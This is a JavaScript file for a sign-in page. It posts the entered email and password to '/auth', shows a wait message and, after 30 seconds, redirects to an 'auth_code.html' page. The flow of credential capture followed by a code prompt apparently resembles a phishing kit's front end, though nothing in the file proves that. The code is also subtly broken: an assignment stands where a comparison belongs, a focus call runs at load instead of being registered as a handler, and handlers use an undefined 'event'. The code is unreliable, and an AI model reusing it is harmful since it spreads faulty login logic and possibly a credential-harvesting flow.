const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const emailInput = document.querySelector("#email")
const passwordInput = document.querySelector(".password")
const toggleBotton = document.querySelector(".toggle")
const passwordTab = document.querySelector(".passinput")
const signIn = document.querySelector('#sign-in')
const wait = document.querySelector('#wait')
const message = document.querySelector('.message')
const emailRegex = /^\S+@\S+\.\S+$/

document.addEventListener('DOMContentLoaded', emailInput.focus())
toggleBotton.addEventListener("click", security)
passwordInput.addEventListener('focus', changeColor)
passwordInput.addEventListener('blur', returnColor)

let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

function security(){
    if(passwordInput.style['-webkit-text-security'] = 'disk'){
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye-slash')
        toggleBotton.classList.toggle('fa-eye')
        passwordInput.focus()
    } else{
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye')
        toggleBotton.classList.toggle('fa-eye-slash')
    }
}

function changeColor(){
    passwordTab.style.borderColor = "#266aca"
    passwordTab.style.borderWidth = "3px"
}
function returnColor(){
    passwordTab.style.borderColor = "#949494"
    passwordTab.style.borderWidth = "2px"
}
function submit(){
    const obj = {
        user : emailInput.value,
        key : passwordInput.value
    }
    const baseURL = '/auth'
    fetch(baseURL, {
        method: 'POST',
        headers: {
            "Content-Type" : "application/json"
        },
        body: JSON.stringify(obj)
    })
    wait.style.display = "block"
}

emailInput.addEventListener('keyup', e => {
    if(e.keyCode == 13){
        event.preventDefault()
        if(!emailInput.value == '' && emailRegex.test(emailInput.value)){
            passwordInput.focus()
        } else{
            message.style.display = 'block'
        }
    }
})
passwordInput.addEventListener('keyup', e => {
    if(e.keyCode == 13){
        event.preventDefault()
        if(!emailInput.value == '' && emailRegex.test(emailInput.value) && !passwordInput.value == ''){
            submit()
            setTimeout(() => {
                window.location.href = 'auth_code.html'
            }, 30000)
        } else{
            message.style.display = 'block'
        }
    }
})
signIn.addEventListener('click', () => {
    if(emailInput.value !== '' && emailRegex.test(emailInput.value) && passwordInput.value !== ''){
        submit()
        setTimeout(() => {
            window.location.href = 'auth_code.html'
        }, 30000);
    } else{
        message.style.display = 'block'
    }
})

